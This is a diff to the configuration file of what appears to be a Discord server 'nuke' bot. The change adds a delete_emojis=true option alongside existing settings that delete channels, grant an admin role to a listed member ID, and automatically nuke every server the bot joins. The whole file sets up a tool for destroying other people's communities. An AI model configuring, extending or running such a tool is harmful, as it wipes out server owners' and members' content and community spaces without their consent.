@@ -10,6 +10,7 @@ delete_channels=true
 # IDs of members who will be given an admin role. As a member cannot assign roles with permissions higher than their own role, this will make and assign a role with
 # the member permissions of the bot
 auto_admin=["911849994020085820"]
+delete_emojis=true
 #  The auto nuke setting will make it so upon joining a server, the nuke will activate automatically
 # Auto nuke also gives the option to nuke all currently joined servers upon startup
 # This requires the program running persistently. The guildID property has no effect when auto nuke is enabled
